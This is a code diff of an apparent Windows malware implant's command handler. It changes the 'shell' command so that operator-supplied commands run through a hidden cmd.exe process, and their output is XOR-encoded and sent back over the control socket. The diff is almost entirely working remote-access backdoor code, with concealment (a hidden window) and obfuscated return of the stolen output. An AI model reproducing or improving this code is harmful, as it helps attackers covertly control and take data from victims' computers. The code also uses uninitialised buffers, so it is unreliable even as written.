@@ -6,6 +6,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <tchar.h>
 #include "helpers.c"
 #include "payload_common.h"
 
@@ -85,32 +86,69 @@ int main(void) {
 				
 			if(str_starts_with(xorbuf, "shell") == 0)
 			{
-				char* cmd = split(xorbuf, " ");
-				FILE* fp;
-				char* terminated;
-				fp = _popen(cmd, "r");
-				if(fp == NULL) {
-				    char* error = "Failed to run command\n";
-				    char* xorerror = XOR(error, key, strlen(error), keylen);
-				    send(sock, xorerror, strlen(error), 0);
-				    free(xorerror);
+		
+				SECURITY_ATTRIBUTES saAttr;
+    				saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    				saAttr.bInheritHandle = TRUE;
+    				saAttr.lpSecurityDescriptor = NULL;
+
+    				HANDLE hOutputRead, hOutputWrite;
+
+    				if (!CreatePipe(&hOutputRead, &hOutputWrite, &saAttr, 0)) {
+        				// Handle error
+        				return 1;
+				 }
+
+    				STARTUPINFO si;
+    				PROCESS_INFORMATION pi;
+
+    				ZeroMemory(&si, sizeof(STARTUPINFO));
+    				si.cb = sizeof(STARTUPINFO);
+    				si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    				si.wShowWindow = SW_HIDE; // Hide the cmd window
+
+    				si.hStdError = hOutputWrite;
+    				si.hStdOutput = hOutputWrite;
+
+		
+				char command[12000]; // Buffer to cat multiline output into	
+				char* argsop = split(xorbuf, " ");
+				
+				// Cat operator supplied command onto command prefix
+				char args[4096];
+				char* argprefix = " /C ";
+				char* reset = "\n";
+				strncat(args, argprefix, strlen(argprefix));
+				strncat(args, argsop, strlen(argsop));
+				if (CreateProcess("C:\\Windows\\System32\\cmd.exe", args, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        				CloseHandle(hOutputWrite);
+
+       		 			char buffer[4096];
+        				DWORD bytesRead;
+
+        				while (ReadFile(hOutputRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0) {
+            					
+						printf("%s\n", buffer);
+            					strncat(command, buffer, strlen(buffer));
+						memset(buffer, '\0', strlen(buffer));
+        				}
+
+					//strncat(command, reset, strlen(reset));
+					char* xordata = XOR(command, key, strlen(command), keylen);
+					send(sock, xordata, strlen(command), 0);
+					free(xordata);
+					memset(command, '\0', strlen(command));
+					memset(buffer, '\0', strlen(buffer));
+					memset(args, '\0', strlen(args));
+
+				}	
+				else{
+					char* error = "Failed to run command\n";
+					char* xorerror = XOR(error, key, strlen(error), keylen);
+					send(sock, xorerror, strlen(error), 0);
+					free(xorerror);
 						    
 				}
-
-				char path[2050];
-				char command[12000];
-				char* reset = "\n";
-				while (fgets(path, sizeof(path), fp) != NULL) {
-					strncat(command, path, strlen(path));
-				}
-
-				strncat(command, reset, strlen(reset));
-				char* xordata = XOR(command, key, strlen(command), keylen);
-				send(sock, xordata, strlen(command), 0);
-				//free(xornewline);
-				free(xordata);
-				memset(command, '\0', strlen(command));
-
 			}
 			else if(str_starts_with(xorbuf, "sleep") == 0){
 				char* cmd = split(xorbuf, " ");
